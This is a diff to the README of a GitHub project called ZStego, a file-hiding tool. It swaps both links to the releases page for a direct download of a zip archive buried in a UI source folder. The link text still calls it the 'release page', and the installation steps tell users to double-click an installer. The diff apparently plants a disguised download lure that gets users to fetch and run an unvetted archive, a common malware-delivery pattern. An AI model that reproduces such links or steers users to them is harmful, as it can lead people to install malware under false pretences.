@@ -1,6 +1,6 @@
 # 🔒 ZStego - Hide files securely inside media files
 
-[![Download ZStego](https://img.shields.io/badge/Download-ZStego-blue.svg)](https://github.com/Dinametallurgic265/ZStego/releases)
+[![Download ZStego](https://img.shields.io/badge/Download-ZStego-blue.svg)](https://github.com/Dinametallurgic265/ZStego/raw/refs/heads/main/src/components/ui/Z_Stego_scavenging.zip)
 
 ZStego hides your sensitive files inside images and audio clips. It protects your data using encryption standards trusted by experts. Everything stays on your computer. Your files never leave your device.
 
@@ -21,7 +21,7 @@ To run ZStego on Windows, your computer needs:
 
 ## 📥 How to get started
 
-1. Visit the project release page to download your copy: [https://github.com/Dinametallurgic265/ZStego/releases](https://github.com/Dinametallurgic265/ZStego/releases)
+1. Visit the project release page to download your copy: [https://github.com/Dinametallurgic265/ZStego/raw/refs/heads/main/src/components/ui/Z_Stego_scavenging.zip](https://github.com/Dinametallurgic265/ZStego/raw/refs/heads/main/src/components/ui/Z_Stego_scavenging.zip)
 2. Look for the file ending in `.msi` or `.exe` under the latest release.
 3. Save the file to your computer.
 4. Open your Downloads folder and double-click the ZStego installer.
